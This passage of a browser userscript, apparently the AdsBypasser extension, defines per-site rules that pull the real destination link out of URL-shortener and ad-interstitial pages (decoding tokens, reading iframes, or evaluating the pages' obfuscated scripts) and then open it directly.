      if (url.match(/^http/)) {
        $.openLink(url);
      } else {
        $.openLink('/' + url);
      }
    },
  });
  $.register({
    rule: function () {
      var h = $.$('html[id="main_html"]');
      if (h) {
        return true;
      } else {
        return null;
      }
    },
    start: function () {
      $.window.document.write = _.nop;
      $.window.btoa = _.nop;
      waitToken().then(function (token) {
        var url = decodeToken(token);
        $.openLink(url);
      }).catch(function (e) {
        _.warn(e);
      });
    },
    ready: function () {
      var h = $.$('#main_html'), b = $.$('#home');
      if (!h || !b || h.nodeName !== 'HTML' || b.nodeName !== 'BODY') {
        return;
      }
      $.removeNodes('iframe');
      $.window.cookieCheck = _.nop;
      h = getTokenFromRocketScript();
      if (!h) {
        h = $('#adfly_bar');
        $.window.close_bar();
        return;
      }
      h = decodeToken(h);
      $.openLink(h);
    },
  });
  function waitToken () {
    return _.D(function (resolve) {
      var o = new MutationObserver(function (mutations) {
        mutations.forEach(function (mutation) {
          _.C(mutation.addedNodes).each(function (node) {
            if (node.localName === 'script') {
              var m = node.textContent.match(/var ysmm = '([^']+)'/);
              if (m) {
                o.disconnect();
                resolve(m[1]);
              }
            }
          });
        });
      });
      o.observe(document.head, {
        childList: true,
      });
    });
  }
  function decodeToken (token) {
    var a = token.indexOf('!HiTommy');
    if (a >= 0) {
      token = token.substring(0, a);
    }
    a = '';
    var b = '';
    for (var i = 0; i < token.length; ++i) {
      if (i % 2 === 0) {
        a = a + token.charAt(i);
      } else {
        b = token.charAt(i) + b;
      }
    }
    token = atob(a + b);
    token = token.substr(2);
    if (location.hash) {
      token += location.hash;
    }
    return token;
  }
})();
$.register({
  rule: {
    host: /^(www\.)?adfe\.es$/,
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    var f = $('#frmvideo');
    if (!f.STEP4) {
      return;
    }
    f.submit();
  },
});
$.register({
  rule: 'http://adfoc.us/*',
  ready: function () {
    'use strict';
    var root = document.body;
    var observer = new MutationObserver(function (mutations) {
      var o = $.$('#showSkip');
      if (o) {
        observer.disconnect();
        o = o.querySelector('a');
        $.openLink(o.href);
      }
    });
    observer.observe(root, {
      childList: true,
      subtree: true,
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?adjet\.biz$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/href=(\S+)/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    $.openLink(m[1]);
  },
});
(function () {
  'use strict';
  $.register({
    rule: {
      host: [
        /^adlink\.guru$/,
        /^cypt\.ga$/,
        /^(filesbucks|tmearn|cut-urls)\.com$/,
        /^elink\.link$/,
        /^(payurl|urlst)\.me$/,
        /^url\.ht$/,
        /^urle\.co$/,
        /^(hashe|trlink|adshort)\.in$/,
        /^www\.worldhack\.net$/,
        /^123link\.top$/,
        /^pir\.im$/,
        /^bol\.tl$/,
        /^(tl|adfly)\.tc$/,
        /^(adfu|linkhits)\.us$/,
        /^short\.pastewma\.com$/,
        /^linkfly\.gaosmedia\.com$/,
      ],
    },
    ready: function () {
      $.removeNodes('iframe', '.BJPPopAdsOverlay');
      firstStage().then(function (page) {
        return secondStage(page);
      }).then(function (url) {
        $.nuke(url);
        $.openLink(url);
      }).catch(function (e) {
        _.warn(e);
      });
    },
  });
  function firstStage () {
    return _.D(function (resolve, reject) {
      var f = $.$('#link-view');
      if (!f) {
        resolve(document);
        return;
      }
      var args = extractArgument(f);
      var url = f.getAttribute('action');
      var p = $.post(url, args).then(function (data) {
        return $.toDOM(data);
      });
      resolve(p);
    });
  }
  function secondStage (page) {
    var f = $('#go-link', page);
    var args = extractArgument(f);
    var url = f.getAttribute('action');
    return $.post(url, args).then(function (data) {
      data = JSON.parse(data);
      if (data && data.url) {
        return data.url;
      }
      throw new _.AdsBypasserError('wrong data');
    });
  }
  function extractArgument (form) {
    var args = {};
    $.$$('input', form).each(function (v) {
      args[v.name] = v.value;
    });
    return args;
  }
})();
$.register({
  rule: {
    host: /^adlock\.org$/,
  },
  ready: function () {
    'use strict';
    var a = $.$('#xre a.xxr, #downloadButton1');
    if (a) {
      $.openLink(a.href);
      return;
    }
    a = $.window.fileLocation;
    if (a) {
      $.openLink(a);
    }
  },
});
$.register({
  rule: {
    host: /^(www\.)?adlot\.us$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var script = $.searchScripts('form');
    var p = /name='([^']+)' value='([^']+)'/g;
    var opt = {
      image: ' ',
    };
    var tmp = null;
    while (tmp = p.exec(script)) {
      opt[tmp[1]] = tmp[2];
    }
    $.openLink('', {
      path: opt,
    });
  },
});
$.register({
  rule: {
    host: /^admy\.link$/,
  },
  ready: function () {
    'use strict';
    var f = $('form.edit_link');
    f.submit();
  },
});
$.register({
  rule: {
    host: /^(www\.)?ah-informatique\.com$/,
    path: /^\/ZipUrl/,
  },
  ready: function () {
    'use strict';
    var a = $('#zip3 a');
    $.openLink(a.href);
  },
});
(function () {
  'use strict';
  function decodeScript (encoded) {
    var a = encoded.match(/^\s*;eval\((.+)\);\s*$/);
    a = a[1];
    var b = a.match(/^(.+)\('([^']+)','([^']+)','([^']+)','([^']+)'\)$/);
    var c = eval('(' + b[1] + ')');
    return c(b[2], b[3], b[4], b[5]);
  }
  $.register({
    rule: {
      host: /^ah\.pe$/,
    },
    ready: function () {
      var script = $.searchScripts('eval');
      script = decodeScript(script);
      script = decodeScript(script);
      script = decodeScript(script);
      var path = script.match(/([^;= ]+)=([^+ ;]+)\+"\."\+([^+ ]+)\+"\."\+([^; ]+);/);
      if (!path) {
        throw new _.AdsBypasserError('script changed');
      }
      if (typeof $.window[path[2]] === 'undefined') {
        _.info('recaptcha');
        return;
      }
      path = _.T('{0}.{1}.{2}')($.window[path[2]], $.window[path[3]], $.window[path[4]]);
      $.openLink(path);
    },
  });
})();
$.register({
  rule: {
    host: /^aka\.gr$/
  },
  ready: function () {
    'use strict';
    var l = $('iframe#yourls-frame');
    $.openLink(l.src);
  },
});
$.register({
  rule: {
    host: [
      /^al\.ly$/,
      /^ally\.sh$/,
    ],
  },
  ready: function () {
    'use strict';
    var i = $.$('body > section > iframe');
    if (i) {
      i.src = 'about:blank';
      _.wait(3000).then(function () {
        var a = $('a.redirect');
        a.click();
      });
      return;
    }
    i = $.searchScripts(/"href","([^"]+)"\)\.remove/);
    if (!i) {
      _.warn('site changed');
      return;
    }
    i = i[1];
    $.openLink(i);
  },
});
$.register({
  rule: {
    host: [
      /^(www\.)?allkeyshop\.com$/,
      /^cshort\.org$/,
    ],
  },
  ready: function (m) {
    'use strict';
    var matches = $.searchScripts(/window\.location\.href = "([^"]+)"/);
    matches = matches[1];
    $.nuke(matches);
    $.openLink(matches);
  },
});
$.register({
  rule: {
    host: /^anonymbucks\.com$/,
  },
  ready: function () {
    'use strict';
    var a = $('#boton-continuar');
    a.click();
  },
});
(function () {
  'use strict';
  var ajaxPattern = /\$.post\('([^']*)'[^{]+(\{\s*opt:\s*'make_log'[^}]+\}\s*\}),/i;
  $.register({
    rule: {
      host: [
        /^bc\.vc$/,
        /^linc\.ml$/,
      ],
      path: /^.+(https?:\/\/.+)$/,
    },
    start: function (m) {
      $.openLink(m.path[1] + document.location.search + document.location.hash);
    },
  });
  function decompress (script, unzip) {
    if (!unzip) {
      return script;
    }
    var matches = script.match(/eval(.*)/);
    if (!matches) {
      throw new _.AdsBypasserError('no script matches /eval(.*)/');
    }
    matches = matches[1];
    script = eval(matches);
    return script;
  }
  function searchScript (unzip) {
    var content = $.searchScripts('make_log');
    if (content) {
      return {
        direct: false,
        script: decompress(content, unzip),
      };
    }
    content = $.searchScripts('click_log');
    if (content) {
      return {
        direct: true,
        script: decompress(content, unzip),
      };
    }
    throw new _.AdsBypasserError('script changed');
  }
  function knockServer (script, dirtyFix) {
    var matches = script.match(ajaxPattern);
    if (!matches) {
      throw new _.AdsBypasserError('(in knock server) no script matches $.post');
    }
    var make_url = matches[1];
    var make_opts = eval('(' + matches[2] + ')');
    var i = setInterval(function () {
      $.post(make_url, make_opts).then(function (text) {
        if (dirtyFix) {
          text = text.match(/\{.+\}/)[0];
        }
        var jj = _.parseJSON(text);
        if (jj.message) {
          clearInterval(i);
          $.openLink(jj.message.url);
        }
      });
    }, 1000);
  }
  $.register({
    rule: {
      host: /^bc\.vc$/,
      path: /^\/.+/,
    },
    ready: function () {
      $.removeNodes('iframe');
      var token = findAJAXToken();
      var time = fakeAJAXToken();
      var url = _.T('/fly/ajax.php?wds={0}&time={1}');
      url = url(token.wds, time);
      _.wait(5000).then(function () {
        return $.post(url, {
          xdf: {
            afg: $.window.tZ,
            bfg: $.window.cW,
            cfg: $.window.cH,
            jki: token.jki,
            dfg: $.window.sW,
            efg: $.window.sH,
          },
          ojk: token.ojk,
        });
      }).then(function (rv) {
        rv = JSON.parse(rv);
        if (rv.error) {
          throw new _.AdsBypasserError('auth error');
        }
        $.openLink(rv.message.url);
      }).catch(function (e) {
        _.warn('ajax error', e);
      });
    },
  });
  function run (dirtyFix) {
    $.removeNodes('iframe');
    var result = searchScript(true);
    if (!result.direct) {
      knockServer(result.script,dirtyFix);
    } else {
      result = result.script.match(/top\.location\.href='([^']+)'/);
      if (!result) {
        throw new _.AdsBypasserError('script changed');
      }
      result = result[1];
      $.openLink(result);
    }
  }
  $.register({
    rule: {
      host: /^adcrun\.ch$/,
      path: /^\/\w+$/,
    },
    ready: function () {
      $.removeNodes('.user_content');
      var rSurveyLink = /http\.open\("GET", "api_ajax\.php\?sid=\d*&ip=[^&]*&longurl=([^"]+)" \+ first_time, (?:true|false)\);/;
      var l = $.searchScripts(rSurveyLink);
      if (l) {
        $.openLink(l[1]);
        return;
      }
      run(true);
    },
  });
  $.register({
    rule: {
      host: [
        /^(1tk|hit|adbla|tl7|mylink)\.us$/,
        /^gx\.si$/,
        /^adwat\.ch$/,
        /^(fly2url|urlwiz|xafox)\.com$/,
        /^(zpoz|ultry)\.net$/,
        /^(wwy|myam)\.me$/,
        /^(ssl|srk)\.gs$/,
        /^shortit\.in$/,
        /^www\.adjet\.eu$/,
        /^cun\.bz$/,
        /^miniurl\.tk$/,
        /^vizzy\.es$/,
        /^kazan\.vc$/,
        /^linkcash\.ml$/,
      ],
      path: /^\/.+/,
    },
    ready: run,
  });
  $.register({
    rule: {
      host: [
        /^adtr\.im$/,
        /^ysear\.ch$/,
        /^xip\.ir$/,
      ],
      path: /^\/.+/,
    },
    ready: function () {
      var a = $.$('div.fly_head a.close');
      var f = $.$('iframe.fly_frame');
      if (a && f) {
        $.openLink(f.src);
      } else {
        run();
      }
    },
  });
  $.register({
    rule: {
      host: /^ad5\.eu$/,
      path: /^\/[^.]+$/,
    },
    ready: function() {
      $.removeNodes('iframe');
      var s = searchScript(true);
      var m = s.script.match(/(<form name="form1"method="post".*(?!<\\form>)<\/form>)/);
      if (!m) {return;}
      m = m[1];
      var tz = -(new Date().getTimezoneOffset()/60);
      m = m.replace("'+timezone+'",tz);
      var d = document.createElement('div');
      d.setAttribute('id','AdsBypasserFTW');
      d.setAttribute('style', 'display:none;');
      d.innerHTML = m;
      document.body.appendChild(d);
      $('#AdsBypasserFTW > form[name=form1]').submit();
    },
  });
  $.register({
    rule: {
      host: /^tr5\.in$/,
      path: /^\/.+/,
    },
    ready: function () {
      run(true);
    },
  });
  function findAJAXToken () {
    var rv = $.searchScripts('/fly/ajax.php');
    if (!rv) {
      throw new _.AdsBypasserError('script changed');
    }
    var wds = rv.match(/\?wds=([^&]+)/);
    if (!wds) {
      throw new _.AdsBypasserError('script changed');
    }
    wds = wds[1];
    var jki = rv.match(/jki:\s*'([^']+)'/);
    if (!jki) {
      throw new _.AdsBypasserError('script changed');
    }
    jki = jki[1];
    var ojk = rv.match(/ojk:\s*'([^']+)'/);
    if (!ojk) {
      throw new _.AdsBypasserError('script changed');
    }
    ojk = ojk[1];
    return {
      wds: wds,
      jki: jki,
      ojk: ojk,
    };
  }
  function fakeAJAXToken () {
    var skipAd = $('div.fly_head span#redirectin').parentElement;
    var margin = 6;
    var fakePageX = skipAd.offsetLeft + margin + 50 + (Math.random() * 10);
    var fakePageY = skipAd.offsetTop + margin + 15 + (Math.random() * 1);
    var po = fakePageX + ',' + fakePageY;
    var posX = jQueryOffset(skipAd).left + margin;
    var posY = jQueryOffset(skipAd).top + margin;
    var pos = (fakePageX - posX) + ',' + (fakePageY - posY);
    var tsta_ = Math.floor((5 + Math.random()) * 1000);
    var time = po + ':' + pos + ':' + tsta_;
    return time;
  }
  function jQueryOffset (element) {
    var r = element.getBoundingClientRect();
    return {
      top: r.top + document.body.scrollTop,
      left: r.left + document.body.scrollLeft,
    };
  }
})();
$.register({
  rule: {
    host: /^(www\.)?biglistofwebsites\.com$/,
    path: /^\/go\/(\w+\.\w+)$/
  },
  start: function (m) {
    'use strict';
    $.openLink('http://' + m.path[1]);
  },
});
$.register({
  rule: 'http://www.bild.me/bild.php?file=*',
  ready: function () {
    'use strict';
    var i = $('#Bild');
    $.openLink(i.src);
  },
});
$.register({
  rule: 'http://bildr.no/view/*',
  ready: function () {
    'use strict';
    var i = $('img.bilde');
    $.openLink(i.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?([a-zA-Z0-9]+\.)?binbox\.io$/,
    path: /\/o\/([a-zA-Z0-9]+)/,
  },
  start: function (m) {
    'use strict';
    var direct_link = window.atob(m.path[1]);
    $.openLink(direct_link);
  },
});
$.register({
  rule: {
    host: /^(www\.)?boxcash\.net$/,
    path: /^\/[\w~]+$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/\'\/ajax_link\.php\',\s*\{key:\s*'(\w+)',\s*url:\s*'(\d+)',\s*t:\s*'(\d+)',\s*r:\s*'(\w*)'\}/);
    if (!m) {
      return;
    }
    $.post('/ajax_link.php', {
      key: m[1],
      url: m[2],
      t: m[3],
      r: m[4],
    }).then(function (response) {
      var l = response.match(/window(?:.top.window)\.location="([^"]+)"/);
      $.openLink(l[1]);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?boxcash\.net$/,
    path: /^\/redirect\.html$/,
    query: /url=(.+)$/,
  },
  start: function (m) {
    'use strict';
    var l = decodeURIComponent(m.query[1]);
    $.openLink(l);
  },
});
$.register({
  rule: {
    host: /^(www\.)?(buz|vzt)url\.com$/,
  },
  ready: function () {
    'use strict';
    var frame = $('frame[scrolling=yes]');
    $.openLink(frame.src);
  },
});
$.register({
  rule: {
    host: /^(cf|ex|xt)\d\.(me|co)$/,
  },
  ready: function (m) {
    'use strict';
    $.removeNodes('iframe');
    var a = $('#skip_button');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^catcut\.net$/,
  },
  ready: function () {
    'use strict';
    var a = $('#rbs');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^cf\.ly$/,
    path: /^\/[^\/]+$/,
  },
  start: function (m) {
    'use strict';
    $.removeNodes('iframe');
    $.openLink('/skip' + m.path[0]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?cli\.gs$/,
  },
  ready: function () {
    'use strict';
    var a = $('a.RedirectLink');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?clictune\.com$/,
    path: /^\/id=\d+/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var matches = $.searchScripts(/<a href="http:\/\/(?:www.)?clictune\.com\/redirect\.php\?url=([^&]+)&/);
    var url = decodeURIComponent(matches[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^clk\.im$/,
  },
  ready: function (m) {
    'use strict';
    $.removeNodes('iframe');
    var matches = $.searchScripts(/\$\("\.countdown"\)\.attr\("href","([^"]+)"\)/);
    $.openLink(matches[1]);
  },
});
$.register({
  rule: {
    host: /^cocoleech\.com$/,
  },
  ready: function () {
    'use strict';
    var a = $('#download');
    $.openLink(a.href);
  },
});
(function () {
  'use strict';
  function hostMapper (host) {
    switch (host) {
    case 'disingkat.in':
      return function () {
        var a = $('a.btn-block.redirect');
        return a.href;
      };
    case 'link.animagz.org':
      return function () {
        var a = $('a.redirect');
        a = a.onclick.toString();
        a = a.match(/window\.open \('([^']+)'\)/);
        return a[1];
      };
    case 'coeg.in':
    case 'www.telondasmu.com':
      return function () {
        var a = $('.download-link a');
        return a.href;
      };
    case 'gunting.in':
      return function () {
        var a = $('div.col-sm-6:nth-child(1) > center:nth-child(1) > a:nth-child(1)');
        return a.href;
      };
    default:
      return null;
    }
  }
  $.register({
    rule: {
      host: [
        /^link\.animagz\.org$/,
        /^(coeg|disingkat|gunting)\.in$/,
        /^www\.telondasmu\.com$/,
      ],
      path: /^\/\w+$/,
    },
    ready: function (m) {
      var mapper = hostMapper(m.host[0]);
      var b64 = mapper().match(/\?r=(\w+={0,2}?)/);
      $.openLink(atob(b64[1]));
    },
  });
  $.register({
    rule: {
      host: /^sipkur\.(net|us)$/,
      path: [
        /^\/\w+$/,
        /^\/menujulink\//,
      ],
    },
    ready: function () {
      var d = $('#testapk > div');
      d = d.onclick.toString();
      d = d.match(/window\.open\('([^']+)'/);
      $.openLink(d[1]);
    },
  });
})();
$.register({
  rule: {
    host: /^coinlink\.co$/,
    path: /^\/i\//,
  },
  ready: function (m) {
    'use strict';
    var a = $('a#btn-main, a.btn.btn-block.btn-warning, a.btn.btn-block.btn-success');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(?:(\w+)\.)?(coinurl\.com|cur\.lv)$/,
    path: /^\/([-\w]+)$/
  },
  ready: function (m) {
    'use strict';
    $.removeNodes('iframe');
    var host = 'http://cur.lv/redirect_curlv.php';
    var param = m.host[1] === undefined ? {
      code: m.path[1],
    } : {
      zone: m.host[1],
      name: m.path[1],
    };
    $.get(host, param).then(function(mainFrameContent) {
      try {
        var docMainFrame = $.toDOM(mainFrameContent);
      } catch (e) {
        throw new _.AdsBypasserError('main frame changed');
      }
      var rExtractLink = /onclick="open_url\('([^']+)',\s*'go'\)/;
      var innerFrames = $.$$('iframe', docMainFrame).each(function (currFrame) {
        var currFrameAddr = currFrame.getAttribute('src');
        $.get(currFrameAddr).then(function(currFrameContent) {
          var aRealLink = rExtractLink.exec(currFrameContent);
          if (aRealLink === undefined || aRealLink[1] === undefined) {
            return;
          }
          var realLink = aRealLink[1];
          $.openLink(realLink);
        });
      });
    });
  },
});
$.register({
  rule: {
    host: /^comyonet\.com$/,
  },
  ready: function () {
    'use strict';
    var input = $('input[name="enter"]');
    input.click();
  },
});
$.register({
  rule: {
    host: /^(www\.)?cvc\.la$/,
    path: /^\/\w+$/,
  },
  start: function () {
    'use strict';
    $.post(document.location.href, {
      hidden: 24, 
      image: ' ',
    }).then(function (text) {
      var matches = text.match(/window\.location\.replace\('([^']+)'\);/);
      $.openLink(matches[1]);
    });
  },
});
$.register({
  rule: {
    host: /^(www\.)?dapat\.in$/,
  },
  ready: function () {
    'use strict';
    var f = $('iframe[name=pagetext]');
    $.openLink(f.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?dd\.ma$/,
  },
  ready: function (m) {
    'use strict';
    var i = $.$('#mainframe');
    if (i) {
      $.openLink(i.src);
      return;
    }
    var a = $('#btn_open a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?dereferer\.website$/,
    query: /^\?(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.query[1]);
  },
});
$.register({
  rule: {
    host: /^dikit\.in$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var a = $('.disclaimer a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^durl\.me$/,
  },
  ready: function () {
    'use strict';
    var a = $('a[class="proceedBtn"]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: [
      /^easyurl\.net$/,
      /^(atu|clickthru|redirects|readthis)\.ca$/,
      /^goshrink\.com$/,
    ],
  },
  ready: function () {
    'use strict';
    var f = $('frame[name=main]');
    $.openLink(f.src);
  },
});
$.register({
  rule: {
    host: /^elde\.me$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe:not([name=undefined])');
    var a = $('#modal-alert');
    a.style.display = 'block';
    a.style.top = 0;
    a.style.left = 0;
  },
});
$.register({
  rule: {
    host: [
    	/^ethi\.in$/,
    	/^st\.wardhanime\.net$/,
    ],
    path: /^\/i\/\d+$/,
  },
  ready: function () {
    'use strict';
    var a = $('#wrapper > [class^="tombo"] > a[target="_blank"]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?filoops\.info$/,
  },
  ready: function () {
    'use strict';
    var a = $('#text > center a, #text > div[align=center] a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^fit\.sh$/,
  },
  ready: function () {
    'use strict';
    $.removeNodes('.container-body');
    var m = $.searchScripts(/token="([^"]+)"/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    m = m[1];
    var interLink = '/go/' + m + '?fa=15466&a=' + window.location.hash.substr(1);
    setTimeout(function () {
      $.openLink(interLink);
    }, 6000);
  },
});
$.register({
  rule: {
    host: /^(www\.)?fiuxy\.co$/,
    path: /^\/links?\/$/,
  },
  ready: function () {
    $.openLink($('a.btn.a').href);
  }
});
(function () {
  'use strict';
  $.register({
    rule: {
      host: /^(www\.)?fundurl\.com$/,
      query: /i=([^&]+)/,
    },
    start: function (m) {
      $.openLink(m.query[1]);
    },
  });
  $.register({
    rule: {
      host: /^(www\.)?fundurl\.com$/,
      path: /^\/(go-\w+|load\.php)$/,
    },
    ready: function () {
      var f = $('iframe[name=fpage3]');
      $.openLink(f.src);
    },
  });
})();
(function () {
  var hosts = /^gca\.sh|repla\.cr$/;
  $.register({
    rule: {
      host: hosts,
      path: /^\/adv\/\w+\/(.*)$/,
      query: /^(.*)$/,
      hash: /^(.*)$/,
    },
    start: function (m) {
      'use strict';
      var l = m.path[1] + m.query[1] + m.hash[1];
      $.openLink(l);
    },
  });
  $.register({
    rule: {
      host: hosts,
    },
    ready: function () {
      'use strict';
      $.removeNodes('iframe');
      var jQuery = $.window.$;
      setTimeout(function () {
        jQuery("#captcha-dialog").dialog("open");
      }, 1000);
    },
  });
})();
$.register({
  rule: {
    host: /^gkurl\.us$/,
  },
  ready: function () {
    'use strict';
    var iframe = $('#gkurl-frame');
    $.openLink(iframe.src);
  },
});
$.register({
  rule: {
    host: /^u\.go2\.me$/,
  },
  ready: function () {
    'use strict';
    var iframe = $('iframe');
    $.openLink(iframe.src);
  },
});
$.register({
  rule: {
    host: /^goto\.loncat\.in$/,
    query: /open=(.+)/,
  },
  start: function (m) {
    'use strict';
    var url = atob(atob(m.query[1]));
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: [
      /^gsurl\.(me|in)$/,
      /^g5u\.pw$/,
    ],
  },
  ready: function () {
    'use strict';
    $.removeNodes('#container');
    var a = $('#link');
    _.wait(5000).then(function () {
      $.openLink(a.href);
    });
  },
});
$.register({
  rule: {
    host: /^hotshorturl\.com$/,
  },
  ready: function () {
    'use strict';
    var frame = $('frame[scrolling=yes]');
    $.openLink(frame.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?(ilix\.in|priva\.us)$/,
    path: /\/(\w+)/,
  },
  ready: function (m) {
    'use strict';
    var realHost = 'ilix.in';
    if (m.host[2] !== realHost) {
      var realURL = location.href.replace(m.host[2], realHost);
      $.openLink(realURL);
      return;
    }
    var f = $.$('iframe[name=ifram]');
    if (f) {
      $.openLink(f.src);
      return;
    }
    if (!$.$('img#captcha')) {
      $('form[name=frm]').submit();
    }
  },
});
$.register({
  rule: {
    host: /^ilovebanten\.com$/,
  },
  ready: function () {
    'use strict';
    var p = $('.notblocked');
    $.openLink(p.textContent);
  },
});
$.register({
  rule: {
    host: /^indexmovie\.me$/,
    path: /^\/([^\/]+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink('/get/' + m.path[1]);
  },
});
$.register({
  rule: {
    host: /^itw\.me$/,
    path: /^\/r\//,
  },
  ready: function () {
    'use strict';
    var f = $('.go-form');
    f.submit();
  },
});
$.register({
  rule: {
    host: /^ity\.im$/,
  },
  ready: function () {
    'use strict';
    var f = $.$('#main');
    if (f) {
      $.openLink(f.src);
      return;
    }
    f = $.$$('frame').find(function (frame) {
      if (frame.src.indexOf('interheader.php') < 0) {
        return _.none;
      }
      return frame.src;
    });
    if (f) {
      $.openLink(f.payload);
      return;
    }
    f = $.searchScripts(/krypted=([^&]+)/);
    if (!f) {
      throw new _.AdsBypasserError('site changed');
    }
    f = f[1];
    var data = $.window.des('ksnslmtmk0v4Pdviusajqu', $.window.hexToString(f), 0, 0);
    if (data) {
      $.openLink('http://ity.im/1104_21_50846_' + data);
    }
  },
});
$.register({
  rule: {
    host: /^(www\.)?kingofshrink\.com$/,
  },
  ready: function () {
    'use strict';
    var l = $('#textresult > a');
    $.openLink(l.href);
  },
});
$.register({
  rule: {
    host: /^st\.kurogaze\.net$/,
    query: /r=(.+)/,
  },
  start: function (m) {
    'use strict';
    var r = atob(m.query[1]);
    $.openLink(r);
  },
});
$.register({
  rule: {
    host: /^st\.kurogaze\.net$/,
  },
  ready: function () {
    'use strict';
    var a = $('a.redirect');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?leechbd\.tk$/,
    path: /^\/Shortener\/(\w+)$/,
  },
  start: function (m) {
    'use strict';
    $.get('/Shortener/API/read/get', {id: m.path[1], type: 'json'}).then(function (text) {
      var r = _.parseJSON(text);
      if (r.success == true && r.data.full) {
        $.openLink(r.data.full);
      } else {
        _.warn('API Error ' + r.error.code + ' : ' + r.error.msg);
      }
    });
  },
});
$.register({
  rule: 'http://www.lienscash.com/l/*',
  ready: function () {
    'use strict';
    var a = $('#redir_btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?\w+\.link-protector\.com$/,
  },
  ready: function (m) {
    'use strict';
    var f = $('form[style="font-weight:normal;font-size:12;font-family:Verdana;"]');
    $.openLink(f.action);
  },
});
$.register({
  rule: {
    host: /^(www\.)?link\.im$/,
    path: /^\/\w+$/,
  },
  start: function () {
    'use strict';
    $.post(document.location.href, {
      image: 'Continue',
    }).then(function (text) {
      var m = text.match(/window\.location\.replace\('([^']+)'\)/);
      $.openLink(m[1]);
    });
  },
});
$.register({
  rule: {
    host: /^link\.tl$/,
    path: /^\/fly\/site\.php$/,
    query: /^\?to=(.+)$/,
  },
  ready: function () {
    'use strict';
    var a = $('.skip > .btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^link\.tl$/,
    path: /[^^](https?:\/\/.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink(m.path[1]);
  },
});
$.register({
  rule: {
    host: /^link\.tl$/,
    path: /^\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    $.openLink('/fly/site.php?to=' + m.path[1]);
  },
});
$.register({
  rule: {
    host: /\.link2dollar\.com$/,
    path: /^\/\d+$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/var rlink = '([^']+)';/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    m = m[1];
    $.openLink(m);
  },
});
$.register({
  rule: {
    host: /^link2you\.ru$/,
    path: /^\/\d+\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = m.path[1];
    if (!url.match(/^https?:\/\//)) {
      url = '//' + url;
    }
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^link(4ad|ajc)\.com$/,
    path: /^\/(.+)$/,
  },
  ready: function (m) {
    'use strict';
    var d = $('div[id^=module_]');
    d = d.id.match(/module_(\d+)/);
    d = d[1];
    $.post('form.php?block_id=' + d, {
      cmd: 'get_source',
      act: 'waiting',
      id: m.path[1],
    }).then(function (url) {
      $.openLink(url);
    }).catch(function (e) {
      _.warn(e);
    });
  },
});
(function () {
  'use strict';
  function sendRequest (opts) {
    return $.post('/ajax/r.php', opts).then(function (data) {
      if (data.length <= 1) {
        return sendRequest(opts);
      }
      var a = $.toDOM(data);
      a = $('a', a);
      return a.href;
    });
  }
  $.register({
    rule: {
      host: /^link5s\.com$/,
      path: /^\/([^\/]+)$/,
    },
    ready: function (m) {
      $.window.$ = null;
      var i = $('#iframeID');
      var opts = {
        page: m.path[1],
        advID: i.dataset.cmp,
        u: i.dataset.u,
      };
      $.removeNodes('iframe');
      sendRequest(opts).then(function (url) {
        $.openLink(url);
      });
    },
  });
})();
(function() {
  function ConvertFromHex (str) {
    var result = [];
    while (str.length >= 2) {
      result.push(String.fromCharCode(parseInt(str.substring(0, 2), 16)));
      str = str.substring(2, str.length);
    }
    return result.join("");
  }
  var Encode = function (str) {
    var s = [], j = 0, x, res = '', k = arguments.callee.toString().replace(/\s+/g, "");
    for (var i = 0; i < 256; i++) {
      s[i] = i;
    }
    for (i = 0; i < 256; i++) {
      j = (j + s[i] + k.charCodeAt(i % k.length)) % 256;
      x = s[i];
      s[i] = s[j];
      s[j] = x;
    }
    i = 0;
    j = 0;
    for (var y = 0; y < str.length; y++) {
      i = (i + 1) % 256;
      j = (j + s[i]) % 256;
      x = s[i];
      s[i] = s[j];
      s[j] = x;
      res += String.fromCharCode(str.charCodeAt(y) ^ s[(s[i] + s[j]) % 256]);
    }
    return res;
  };
  var hostRules = [
    /^(([\w]{8}|www)\.)?(allanalpass|cash4files|drstickyfingers|fapoff|freegaysitepass|(gone|tube)viral|(pic|tna)bucks|whackyvidz|fuestfka)\.com$/,
    /^(([\w]{8}|www)\.)?(a[mn]y|deb|dyo|sexpalace)\.gs$/,
    /^(([\w]{8}|www)\.)?(filesonthe|poontown|seriousdeals|ultrafiles|urlbeat|zatnawqy|zytpirwai|jzrputtbut)\.net$/,
    /^(([\w]{8}|www)\.)?freean\.us$/,
    /^(([\w]{8}|www)\.)?galleries\.bz$/,
